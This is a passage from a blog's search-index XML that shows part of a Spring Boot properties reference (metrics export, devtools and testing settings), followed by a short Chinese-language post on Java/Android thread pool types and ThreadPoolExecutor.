exporting of metrics to this backend is enabled.</span><br><span class="line">management.metrics.export.atlas.eval-uri=http://localhost:7101/lwc/api/v1/evaluate # URI for the Atlas LWC endpoint to evaluate the data for a subscription.</span><br><span class="line">management.metrics.export.atlas.lwc-enabled=false # Whether to enable streaming to Atlas LWC.</span><br><span class="line">management.metrics.export.atlas.meter-time-to-live=15m # Time to live for meters that do not have any activity. After this period the meter will be considered expired and will not get reported.</span><br><span class="line">management.metrics.export.atlas.num-threads=2 # Number of threads to use with the metrics publishing scheduler.</span><br><span class="line">management.metrics.export.atlas.read-timeout=10s # Read timeout for requests to this backend.</span><br><span class="line">management.metrics.export.atlas.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.atlas.uri=http://localhost:7101/api/v1/publish # URI of the Atlas server.</span><br><span class="line">management.metrics.export.datadog.api-key= # Datadog API key.</span><br><span class="line">management.metrics.export.datadog.application-key= # Datadog application key. Not strictly required, but improves the Datadog experience by sending meter descriptions, types, and base units to Datadog.</span><br><span class="line">management.metrics.export.datadog.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.</span><br><span class="line">management.metrics.export.datadog.connect-timeout=1s # Connection timeout for requests to this backend.</span><br><span class="line">management.metrics.export.datadog.descriptions=true # Whether to publish descriptions metadata to Datadog. Turn this off to minimize the amount of metadata sent.</span><br><span class="line">management.metrics.export.datadog.enabled=true # Whether exporting of metrics to this backend is enabled.</span><br><span class="line">management.metrics.export.datadog.host-tag=instance # Tag that will be mapped to &quot;host&quot; when shipping metrics to Datadog.</span><br><span class="line">management.metrics.export.datadog.num-threads=2 # Number of threads to use with the metrics publishing scheduler.</span><br><span class="line">management.metrics.export.datadog.read-timeout=10s # Read timeout for requests to this backend.</span><br><span class="line">management.metrics.export.datadog.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.datadog.uri=https://app.datadoghq.com # URI to ship metrics to. If you need to publish metrics to an internal proxy en-route to Datadog, you can define the location of the proxy with this.</span><br><span class="line">management.metrics.export.ganglia.addressing-mode=multicast # UDP addressing mode, either unicast or multicast.</span><br><span class="line">management.metrics.export.ganglia.duration-units=milliseconds # Base time unit used to report durations.</span><br><span class="line">management.metrics.export.ganglia.enabled=true # Whether exporting of metrics to Ganglia is enabled.</span><br><span class="line">management.metrics.export.ganglia.host=localhost # Host of the Ganglia server to receive exported metrics.</span><br><span class="line">management.metrics.export.ganglia.port=8649 # Port of the Ganglia server to receive exported metrics.</span><br><span class="line">management.metrics.export.ganglia.protocol-version=3.1 # Ganglia protocol version. Must be either 3.1 or 3.0.</span><br><span class="line">management.metrics.export.ganglia.rate-units=seconds # Base time unit used to report rates.</span><br><span class="line">management.metrics.export.ganglia.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.ganglia.time-to-live=1 # Time to live for metrics on Ganglia. Set the multi-cast Time-To-Live to be one greater than the number of hops (routers) between the hosts.</span><br><span class="line">management.metrics.export.graphite.duration-units=milliseconds # Base time unit used to report durations.</span><br><span class="line">management.metrics.export.graphite.enabled=true # Whether exporting of metrics to Graphite is enabled.</span><br><span class="line">management.metrics.export.graphite.host=localhost # Host of the Graphite server to receive exported metrics.</span><br><span class="line">management.metrics.export.graphite.port=2004 # Port of the Graphite server to receive exported metrics.</span><br><span class="line">management.metrics.export.graphite.protocol=pickled # Protocol to use while shipping data to Graphite.</span><br><span class="line">management.metrics.export.graphite.rate-units=seconds # Base time unit used to report rates.</span><br><span class="line">management.metrics.export.graphite.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.graphite.tags-as-prefix= # For the default naming convention, turn the specified tag keys into part of the metric prefix.</span><br><span class="line">management.metrics.export.influx.auto-create-db=true # Whether to create the Influx database if it does not exist before attempting to publish metrics to it.</span><br><span class="line">management.metrics.export.influx.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.</span><br><span class="line">management.metrics.export.influx.compressed=true # Whether to enable GZIP compression of metrics batches published to Influx.</span><br><span class="line">management.metrics.export.influx.connect-timeout=1s # Connection timeout for requests to this backend.</span><br><span class="line">management.metrics.export.influx.consistency=one # Write consistency for each point.</span><br><span class="line">management.metrics.export.influx.db=mydb # Tag that will be mapped to &quot;host&quot; when shipping metrics to Influx.</span><br><span class="line">management.metrics.export.influx.enabled=true # Whether exporting of metrics to this backend is enabled.</span><br><span class="line">management.metrics.export.influx.num-threads=2 # Number of threads to use with the metrics publishing scheduler.</span><br><span class="line">management.metrics.export.influx.password= # Login password of the Influx server.</span><br><span class="line">management.metrics.export.influx.read-timeout=10s # Read timeout for requests to this backend.</span><br><span class="line">management.metrics.export.influx.retention-policy= # Retention policy to use (Influx writes to the DEFAULT retention policy if one is not specified).</span><br><span class="line">management.metrics.export.influx.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.influx.uri=http://localhost:8086 # URI of the Influx server.</span><br><span class="line">management.metrics.export.influx.user-name= # Login user of the Influx server.</span><br><span class="line">management.metrics.export.jmx.enabled=true # Whether exporting of metrics to JMX is enabled.</span><br><span class="line">management.metrics.export.jmx.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.newrelic.account-id= # New Relic account ID.</span><br><span class="line">management.metrics.export.newrelic.api-key= # New Relic API key.</span><br><span class="line">management.metrics.export.newrelic.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.</span><br><span class="line">management.metrics.export.newrelic.connect-timeout=1s # Connection timeout for requests to this backend.</span><br><span class="line">management.metrics.export.newrelic.enabled=true # Whether exporting of metrics to this backend is enabled.</span><br><span class="line">management.metrics.export.newrelic.num-threads=2 # Number of threads to use with the metrics publishing scheduler.</span><br><span class="line">management.metrics.export.newrelic.read-timeout=10s # Read timeout for requests to this backend.</span><br><span class="line">management.metrics.export.newrelic.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.newrelic.uri=https://insights-collector.newrelic.com # URI to ship metrics to.</span><br><span class="line">management.metrics.export.prometheus.descriptions=true # Whether to enable publishing descriptions as part of the scrape payload to Prometheus. Turn this off to minimize the amount of data sent on each scrape.</span><br><span class="line">management.metrics.export.prometheus.enabled=true # Whether exporting of metrics to Prometheus is enabled.</span><br><span class="line">management.metrics.export.prometheus.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.signalfx.access-token= # SignalFX access token.</span><br><span class="line">management.metrics.export.signalfx.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.</span><br><span class="line">management.metrics.export.signalfx.connect-timeout=1s # Connection timeout for requests to this backend.</span><br><span class="line">management.metrics.export.signalfx.enabled=true # Whether exporting of metrics to this backend is enabled.</span><br><span class="line">management.metrics.export.signalfx.num-threads=2 # Number of threads to use with the metrics publishing scheduler.</span><br><span class="line">management.metrics.export.signalfx.read-timeout=10s # Read timeout for requests to this backend.</span><br><span class="line">management.metrics.export.signalfx.source= # Uniquely identifies the app instance that is publishing metrics to SignalFx. Defaults to the local host name.</span><br><span class="line">management.metrics.export.signalfx.step=10s # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.signalfx.uri=https://ingest.signalfx.com # URI to ship metrics to.</span><br><span class="line">management.metrics.export.simple.enabled=true # Whether, in the absence of any other exporter, exporting of metrics to an in-memory backend is enabled.</span><br><span class="line">management.metrics.export.simple.mode=cumulative # Counting mode.</span><br><span class="line">management.metrics.export.simple.step=1m # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.statsd.enabled=true # Whether exporting of metrics to StatsD is enabled.</span><br><span class="line">management.metrics.export.statsd.flavor=datadog # StatsD line protocol to use.</span><br><span class="line">management.metrics.export.statsd.host=localhost # Host of the StatsD server to receive exported metrics.</span><br><span class="line">management.metrics.export.statsd.max-packet-length=1400 # Total length of a single payload should be kept within your network&apos;s MTU.</span><br><span class="line">management.metrics.export.statsd.polling-frequency=10s # How often gauges will be polled. When a gauge is polled, its value is recalculated and if the value has changed (or publishUnchangedMeters is true), it is sent to the StatsD server.</span><br><span class="line">management.metrics.export.statsd.port=8125 # Port of the StatsD server to receive exported metrics.</span><br><span class="line">management.metrics.export.statsd.publish-unchanged-meters=true # Whether to send unchanged meters to the StatsD server.</span><br><span class="line">management.metrics.export.statsd.queue-size=2147483647 # Maximum size of the queue of items waiting to be sent to the StatsD server.</span><br><span class="line">management.metrics.export.wavefront.api-token= # API token used when publishing metrics directly to the Wavefront API host.</span><br><span class="line">management.metrics.export.wavefront.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.</span><br><span class="line">management.metrics.export.wavefront.connect-timeout=1s # Connection timeout for requests to this backend.</span><br><span class="line">management.metrics.export.wavefront.enabled=true # Whether exporting of metrics to this backend is enabled.</span><br><span class="line">management.metrics.export.wavefront.global-prefix= # Global prefix to separate metrics originating from this app&apos;s white box instrumentation from those originating from other Wavefront integrations when viewed in the Wavefront UI.</span><br><span class="line">management.metrics.export.wavefront.num-threads=2 # Number of threads to use with the metrics publishing scheduler.</span><br><span class="line">management.metrics.export.wavefront.read-timeout=10s # Read timeout for requests to this backend.</span><br><span class="line">management.metrics.export.wavefront.source= # Unique identifier for the app instance that is the source of metrics being published to Wavefront. Defaults to the local host name.</span><br><span class="line">management.metrics.export.wavefront.step=10s # Step size (i.e. reporting frequency) to use.</span><br><span class="line">management.metrics.export.wavefront.uri=https://longboard.wavefront.com # URI to ship metrics to.</span><br><span class="line">management.metrics.use-global-registry=true # Whether auto-configured MeterRegistry implementations should be bound to the global static registry on Metrics.</span><br><span class="line">management.metrics.web.client.max-uri-tags=100 # Maximum number of unique URI tag values allowed. After the max number of tag values is reached, metrics with additional tag values are denied by filter.</span><br><span class="line">management.metrics.web.client.requests-metric-name=http.client.requests # Name of the metric for sent requests.</span><br><span class="line">management.metrics.web.server.auto-time-requests=true # Whether requests handled by Spring MVC or WebFlux should be automatically timed.</span><br><span class="line">management.metrics.web.server.requests-metric-name=http.server.requests # Name of the metric for received requests.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------------------------------</span><br><span class="line"># DEVTOOLS PROPERTIES</span><br><span class="line"># ----------------------------------------</span><br><span class="line"></span><br><span class="line"># DEVTOOLS (DevToolsProperties)</span><br><span class="line">spring.devtools.livereload.enabled=true # Whether to enable a livereload.com-compatible server.</span><br><span class="line">spring.devtools.livereload.port=35729 # Server port.</span><br><span class="line">spring.devtools.restart.additional-exclude= # Additional patterns that should be excluded from triggering a full restart.</span><br><span class="line">spring.devtools.restart.additional-paths= # Additional paths to watch for changes.</span><br><span class="line">spring.devtools.restart.enabled=true # Whether to enable automatic restart.</span><br><span class="line">spring.devtools.restart.exclude=META-INF/maven/**,META-INF/resources/**,resources/**,static/**,public/**,templates/**,**/*Test.class,**/*Tests.class,git.properties,META-INF/build-info.properties # Patterns that should be excluded from triggering a full restart.</span><br><span class="line">spring.devtools.restart.log-condition-evaluation-delta=true # Whether to log the condition evaluation delta upon restart.</span><br><span class="line">spring.devtools.restart.poll-interval=1s # Amount of time to wait between polling for classpath changes.</span><br><span class="line">spring.devtools.restart.quiet-period=400ms # Amount of quiet time required without any classpath changes before a restart is triggered.</span><br><span class="line">spring.devtools.restart.trigger-file= # Name of a specific file that, when changed, triggers the restart check. If not specified, any classpath file change triggers the restart.</span><br><span class="line"></span><br><span class="line"># REMOTE DEVTOOLS (RemoteDevToolsProperties)</span><br><span class="line">spring.devtools.remote.context-path=/.~~spring-boot!~ # Context path used to handle the remote connection.</span><br><span class="line">spring.devtools.remote.proxy.host= # The host of the proxy to use to connect to the remote application.</span><br><span class="line">spring.devtools.remote.proxy.port= # The port of the proxy to use to connect to the remote application.</span><br><span class="line">spring.devtools.remote.restart.enabled=true # Whether to enable remote restart.</span><br><span class="line">spring.devtools.remote.secret= # A shared secret required to establish a connection (required to enable remote support).</span><br><span class="line">spring.devtools.remote.secret-header-name=X-AUTH-TOKEN # HTTP header used to transfer the shared secret.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------------------------------</span><br><span class="line"># TESTING PROPERTIES</span><br><span class="line"># ----------------------------------------</span><br><span class="line"></span><br><span class="line">spring.test.database.replace=any # Type of existing DataSource to replace.</span><br><span class="line">spring.test.mockmvc.print=default # MVC Print option.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>Android 线程池</title>
    <url>/Android/Android%20%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<p><code>ExecutorService</code> 是Java提供的用于管理线程池的类。</p>
<h4 id="1、FixedThreadPool"><a href="#1、FixedThreadPool" class="headerlink" title="1、FixedThreadPool"></a>1、FixedThreadPool</h4><p><code>FixedThreadPool</code> ，固定线程数的线程池，核心线程数和最大线程数是一样的；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 创建一个可重用固定个数的线程池</span><br><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(3);</span><br></pre></td></tr></table></figure>
<h4 id="2、CachedThreadPool"><a href="#2、CachedThreadPool" class="headerlink" title="2、CachedThreadPool"></a>2、CachedThreadPool</h4><p><code>CachedThreadPool</code>，缓存线程，池线程数可以持续增加。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 创建一个可缓存线程池</span><br><span class="line">ExecutorService executorService = Executors.newCachedThreadPool();</span><br></pre></td></tr></table></figure>
<h4 id="3、ScheduledThreadPool"><a href="#3、ScheduledThreadPool" class="headerlink" title="3、ScheduledThreadPool"></a>3、ScheduledThreadPool</h4><p><code>ScheduledThreadPool</code>，周期性执行任务的线程池，定时或周期性的执行任务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//核心线程数是3</span><br><span class="line">ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(3);</span><br><span class="line"></span><br><span class="line">//周期执行一次</span><br><span class="line">scheduledExecutorService.scheduleAtFixedRate(new Runnable() &#123;</span><br><span class="line">    public void run() &#123;</span><br><span class="line">    Log.d(TAG,Thread.currentThread().getName()+ &quot;正在执行&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;, 1, 500, TimeUnit.MILLISECONDS);</span><br></pre></td></tr></table></figure>
<h4 id="4、SingleThreadExecutor"><a href="#4、SingleThreadExecutor" class="headerlink" title="4、SingleThreadExecutor"></a>4、SingleThreadExecutor</h4><p><code>SingleThreadExecutor</code>，单线程池，核心线程数是1，任务会按顺序执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();</span><br></pre></td></tr></table></figure>
<h4 id="5、SingleThreadScheduledExecutor"><a href="#5、SingleThreadScheduledExecutor" class="headerlink" title="5、SingleThreadScheduledExecutor"></a>5、SingleThreadScheduledExecutor</h4><p><code>SingleThreadScheduledExecutor</code>，周期性执行任务的单线程池，核心线程数是1，只有一个任务在同一个时间执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ScheduledExecutorService service = Executors.newSingleThreadScheduledExecutor();</span><br></pre></td></tr></table></figure>
<p>总结，上面常用的线程池最终调用的都是 <code>ThreadPoolExecutor</code> : </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ThreadPoolExecutor(int corePoolSize,    //核心线程数</span><br><span class="line">                          int maximumPoolSize, //最大线程数</span><br><span class="line">                          long keepAliveTime,  //空闲线程存活时间</span><br><span class="line">                          TimeUnit unit,       //存活时间单位</span><br><span class="line">                          BlockingQueue&lt;Runnable&gt; workQueue //用于保存等待执行任务的阻塞队列</span><br><span class="line">                          ) &#123;</span><br><span class="line">    this(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue,</span><br><span class="line">         Executors.defaultThreadFactory(), defaultHandler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
</search>
